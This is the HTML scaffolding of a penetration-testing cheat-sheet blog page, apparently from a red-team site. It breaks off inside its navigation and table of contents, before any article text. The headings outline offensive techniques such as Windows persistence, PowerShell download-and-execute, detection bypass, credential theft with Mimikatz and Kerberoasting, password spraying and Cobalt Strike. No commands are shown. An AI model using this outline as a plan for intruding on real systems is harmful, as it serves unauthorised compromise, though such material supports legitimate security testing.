
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Threatexpress Blog">
      
      
      
      
        <link rel="prev" href="../git-clone-entire-org/">
      
      
        <link rel="next" href="../../2018/a-deep-dive-into-cobalt-strike-malleable-c2/">
      
      
      <link rel="icon" href="../../../img/favicon.ico">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.11">
    
    
      
        <title>Penetration Testing Pasties - Threatexpress</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.4af4bdda.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../css/extra.css">
    
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="red">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#penetration-testing-pasties" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="Threatexpress" class="md-header__button md-logo" aria-label="Threatexpress" data-md-component="logo">
      
  <img src="../../../img/threatexpress_logo.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Threatexpress
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Penetration Testing Pasties
            
          </span>
        </div>
      </div>
    </div>
    
      
    
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/threatexpress" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
  </div>
  <div class="md-source__repository">
    threatexpress/threatexpress
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="Threatexpress" class="md-nav__button md-logo" aria-label="Threatexpress" data-md-component="logo">
      
  <img src="../../../img/threatexpress_logo.png" alt="logo">

    </a>
    Threatexpress
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/threatexpress" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
  </div>
  <div class="md-source__repository">
    threatexpress/threatexpress
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Home
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="https://redteam.guide" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    REDTEAM.GUIDE
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Posts
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Posts
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
        
          
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    2020
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            2020
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2020/threatbox-standard-attack-platform/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ThreatBox - Standard Attack Platform
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../2020/red-team-development-and-operations/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Red Team Development and Operations
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
        
          
          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    2019
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_2">
            <span class="md-nav__icon md-icon"></span>
            2019
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../event-data-collector/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Event Data Collector
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../c2-agent-comparison/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    C2 Agent Comparison
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../git-clone-entire-org/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Git clone all organizational repos
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Penetration Testing Pasties
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Penetration Testing Pasties
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#foca" class="md-nav__link">
    <span class="md-ellipsis">
      FOCA
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#maltego" class="md-nav__link">
    <span class="md-ellipsis">
      Maltego
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconng" class="md-nav__link">
    <span class="md-ellipsis">
      ReconNG
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#metagoofil" class="md-nav__link">
    <span class="md-ellipsis">
      Metagoofil
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#censysio" class="md-nav__link">
    <span class="md-ellipsis">
      censys.io
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#network-scanning" class="md-nav__link">
    <span class="md-ellipsis">
      Network Scanning
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Network Scanning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dsnrecon" class="md-nav__link">
    <span class="md-ellipsis">
      dsnrecon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#theharvester" class="md-nav__link">
    <span class="md-ellipsis">
      TheHarvester
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    <span class="md-ellipsis">
      Nmap
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Nmap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ids-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      IDS Evasion
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web" class="md-nav__link">
    <span class="md-ellipsis">
      Web
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Web">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#eyewitness" class="md-nav__link">
    <span class="md-ellipsis">
      Eyewitness
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows" class="md-nav__link">
    <span class="md-ellipsis">
      Windows
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#built-in-commands" class="md-nav__link">
    <span class="md-ellipsis">
      Built-in Commands
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Built-in Commands">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#dsquery" class="md-nav__link">
    <span class="md-ellipsis">
      DSQUERY
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sqlcmd" class="md-nav__link">
    <span class="md-ellipsis">
      SQLCMD
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ntdsutil" class="md-nav__link">
    <span class="md-ellipsis">
      NTDSUTIL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#applocker" class="md-nav__link">
    <span class="md-ellipsis">
      Applocker
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-defender" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Defender
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#appcmd" class="md-nav__link">
    <span class="md-ellipsis">
      APPCMD
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-lateral-movement" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Lateral Movement
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-persistence-methods" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Persistence Methods
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows Persistence Methods">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#registry-keys" class="md-nav__link">
    <span class="md-ellipsis">
      Registry Keys
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Registry Keys">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#modify-registry-keys" class="md-nav__link">
    <span class="md-ellipsis">
      Modify registry keys
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Modify registry keys">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#userinit-key" class="md-nav__link">
    <span class="md-ellipsis">
      Userinit Key
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#run-key" class="md-nav__link">
    <span class="md-ellipsis">
      Run Key
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#list-image-file-execution-options-debugger-file-executed-when-the-target-file-is-run" class="md-nav__link">
    <span class="md-ellipsis">
      List Image File Execution Options (Debugger file executed when the target file is run)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#appinit_dlls" class="md-nav__link">
    <span class="md-ellipsis">
      AppInit_DLLs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#no-reboot-sethcutilman-option-using-a-debugger-key" class="md-nav__link">
    <span class="md-ellipsis">
      No-reboot sethc/utilman option using a "debugger" key
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-storage-locations" class="md-nav__link">
    <span class="md-ellipsis">
      File Storage Locations
    </span>
  </a>
  
    <nav class="md-nav" aria-label="File Storage Locations">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#startup-folders" class="md-nav__link">
    <span class="md-ellipsis">
      Startup Folders
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sethcutilman-replacement" class="md-nav__link">
    <span class="md-ellipsis">
      SETHC/UTILMAN Replacement
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#volume-shadow-copy-restore-points" class="md-nav__link">
    <span class="md-ellipsis">
      Volume Shadow Copy (Restore Points)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vssadmin-native-windows-utility" class="md-nav__link">
    <span class="md-ellipsis">
      VSSADMIN - native windows utility
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#use-wmic-process-call-to-run-an-exe-from-a-volume-shadow-copy" class="md-nav__link">
    <span class="md-ellipsis">
      Use WMIC process call to run an .exe from a Volume Shadow Copy
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#task-scheduling" class="md-nav__link">
    <span class="md-ellipsis">
      Task Scheduling
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task Scheduling">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#at" class="md-nav__link">
    <span class="md-ellipsis">
      AT
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#schtasks" class="md-nav__link">
    <span class="md-ellipsis">
      SCHTASKS
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#additional-notes" class="md-nav__link">
    <span class="md-ellipsis">
      Additional Notes
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-service" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Service
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dll-hijacking" class="md-nav__link">
    <span class="md-ellipsis">
      DLL-Hijacking
    </span>
  </a>
  
    <nav class="md-nav" aria-label="DLL-Hijacking">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#linkinfodll-replacement" class="md-nav__link">
    <span class="md-ellipsis">
      linkinfo.dll Replacement
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wmi-event-persistence-via-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      WMI Event Persistence via Powershell
    </span>
  </a>
  
    <nav class="md-nav" aria-label="WMI Event Persistence via Powershell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#wmi-event-filter" class="md-nav__link">
    <span class="md-ellipsis">
      WMI Event Filter
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#event-consumer" class="md-nav__link">
    <span class="md-ellipsis">
      Event Consumer
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#filterconsumer-binding" class="md-nav__link">
    <span class="md-ellipsis">
      Filter/Consumer Binding
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#removal" class="md-nav__link">
    <span class="md-ellipsis">
      REMOVAL
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#malicious-outlook-rules" class="md-nav__link">
    <span class="md-ellipsis">
      Malicious Outlook Rules
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-remote-management-winrm-psremoting" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Remote Management (WinRM) / PSRemoting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uninstall-a-patch-to-leave-the-system-vulnerable" class="md-nav__link">
    <span class="md-ellipsis">
      Uninstall a patch to leave the system vulnerable
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create-custom-dll-for-password-filters-and-install-on-dc-to-capture-changed-passwords" class="md-nav__link">
    <span class="md-ellipsis">
      Create custom DLL for password filters and install on DC to capture changed passwords
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#application-whitelisting-bypass-techniques" class="md-nav__link">
    <span class="md-ellipsis">
      Application Whitelisting Bypass Techniques
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#certutil" class="md-nav__link">
    <span class="md-ellipsis">
      Certutil
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#active-directory-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Active Directory Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Active Directory Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#adfind" class="md-nav__link">
    <span class="md-ellipsis">
      Adfind
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Powershell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#find-files-custom" class="md-nav__link">
    <span class="md-ellipsis">
      Find-Files (custom)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-enumeration-custom" class="md-nav__link">
    <span class="md-ellipsis">
      Get-Enumeration (custom)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#download-and-execute-iex" class="md-nav__link">
    <span class="md-ellipsis">
      Download and execute IEX
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#encodedcommand-and-iex-detection-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      EncodedCommand and IEX detection bypass
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bloodhound" class="md-nav__link">
    <span class="md-ellipsis">
      Bloodhound
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mimikittenz" class="md-nav__link">
    <span class="md-ellipsis">
      Mimikittenz
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerup" class="md-nav__link">
    <span class="md-ellipsis">
      PowerUp
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerview" class="md-nav__link">
    <span class="md-ellipsis">
      PowerView
    </span>
  </a>
  
    <nav class="md-nav" aria-label="PowerView">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#net-functions" class="md-nav__link">
    <span class="md-ellipsis">
      net * Functions:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#gpo-functions" class="md-nav__link">
    <span class="md-ellipsis">
      GPO functions
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#user-hunting-functions" class="md-nav__link">
    <span class="md-ellipsis">
      User-Hunting Functions:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domain-trust-functions" class="md-nav__link">
    <span class="md-ellipsis">
      Domain Trust Functions:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#metafunctions" class="md-nav__link">
    <span class="md-ellipsis">
      MetaFunctions:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inveigh" class="md-nav__link">
    <span class="md-ellipsis">
      Inveigh
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Inveigh">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#privilege-requirements" class="md-nav__link">
    <span class="md-ellipsis">
      Privilege Requirements:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#features" class="md-nav__link">
    <span class="md-ellipsis">
      Features:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-wout-powershell" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell W/out Powershell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-indexeditem" class="md-nav__link">
    <span class="md-ellipsis">
      Get-IndexedItem
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#interacting-w-windows-api" class="md-nav__link">
    <span class="md-ellipsis">
      Interacting w/ Windows API
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Interacting w/ Windows API">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#example-lock-workstation-and-messagebox" class="md-nav__link">
    <span class="md-ellipsis">
      Example - Lock Workstation and MessageBox
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mailsniper-owa-and-exchange-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      MailSniper (OWA and Exchange Enumeration)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="MailSniper (OWA and Exchange Enumeration)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name" class="md-nav__link">
    <span class="md-ellipsis">
      Locate OWA instances via Autodiscover using only organization primary domain name
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domainpasswordspray-internal-windows-domain-password-brute-forcing" class="md-nav__link">
    <span class="md-ellipsis">
      DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#quick-start-guide" class="md-nav__link">
    <span class="md-ellipsis">
      Quick Start Guide
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#invoke-domainpasswordspray-options" class="md-nav__link">
    <span class="md-ellipsis">
      Invoke-DomainPasswordSpray Options
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#misc-powershell-pasties" class="md-nav__link">
    <span class="md-ellipsis">
      Misc Powershell Pasties
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mimikatz" class="md-nav__link">
    <span class="md-ellipsis">
      Mimikatz
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerberoast" class="md-nav__link">
    <span class="md-ellipsis">
      Kerberoast
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#domain-admin-privesc-methods" class="md-nav__link">
    <span class="md-ellipsis">
      Domain Admin Privesc Methods
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#command-and-control" class="md-nav__link">
    <span class="md-ellipsis">
      Command and Control
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Command and Control">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-fronting" class="md-nav__link">
    <span class="md-ellipsis">
      Domain Fronting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cobalt-strike" class="md-nav__link">
    <span class="md-ellipsis">
      Cobalt Strike
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Cobalt Strike">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#opsec-considerations-for-beacon-commands" class="md-nav__link">
    <span class="md-ellipsis">
      OPSEC Considerations for Beacon Commands
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-function-wrapper" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell Function Wrapper
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#persistence-scripts" class="md-nav__link">
    <span class="md-ellipsis">
      Persistence Scripts
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
